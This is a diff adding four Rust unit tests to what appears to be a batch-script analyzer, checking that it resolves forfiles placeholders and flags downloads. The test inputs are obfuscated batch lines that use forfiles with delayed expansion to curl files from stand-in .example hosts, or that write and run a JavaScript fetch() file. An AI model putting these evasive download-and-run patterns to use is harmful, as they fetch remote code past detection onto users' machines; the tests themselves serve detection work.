@@ -13546,6 +13546,90 @@ forfiles /p C:\Work /m *.js /c "cmd /c @path""#;
             );
         }
     }
+
+    #[test]
+    fn forfiles_dot_root_placeholder_matches_current_directory_file() {
+        let script = br#"echo seed>payload.txt
+forfiles /p . /m payload.txt /c "cmd /V:ON /c set U=https://forfiles-dot-root.example/@file&&curl -o @file !U!""#;
+        let report = analyze(script, &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst, .. }
+                        if src == "https://forfiles-dot-root.example/payload.txt"
+                            && dst.as_deref() == Some("payload.txt")
+                )
+            }),
+            "forfiles /p . did not substitute @file for current-directory match: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn forfiles_placeholder_cmd_child_does_not_reexpand_into_wrapper() {
+        let script = br#"echo seed>payload.txt
+forfiles /m payload.txt /c "cmd /V:ON /c set U=https://forfiles-subst.example/@file&&curl -o @file !U!""#;
+        let report = analyze(script, &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst, .. }
+                        if src == "https://forfiles-subst.example/payload.txt"
+                            && dst.as_deref() == Some("payload.txt")
+                )
+            }),
+            "forfiles substituted child download not surfaced: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+        let repeats = report
+            .deobfuscated
+            .matches("https://forfiles-subst.example/payload.txt")
+            .count();
+        assert!(
+            repeats <= 3,
+            "forfiles substituted child re-expanded into wrapper {repeats} times:\n{}",
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn forfiles_name_and_ext_placeholders_feed_tracked_script_execution() {
+        let script = br#"echo fetch('https://forfiles-name-ext.example/payload') > C:\Work\run.js
+forfiles /p C:\Work /m *.js /c "cmd /c C:\Work\@fname@ext""#;
+        let report = analyze(script, &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(t, Trait::Download { src, .. } if src == "https://forfiles-name-ext.example/payload")
+            }),
+            "forfiles @fname/@ext did not analyze generated script: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn forfiles_relpath_placeholder_feeds_nested_tracked_script_execution() {
+        let script =
+            br#"echo fetch('https://forfiles-relpath.example/payload') > C:\Work\Sub\run.js
+forfiles /p C:\Work /s /m *.js /c "cmd /c C:\Work\@relpath""#;
+        let report = analyze(script, &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(t, Trait::Download { src, .. } if src == "https://forfiles-relpath.example/payload")
+            }),
+            "forfiles @relpath did not analyze nested generated script: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
 }
 
 #[cfg(test)]
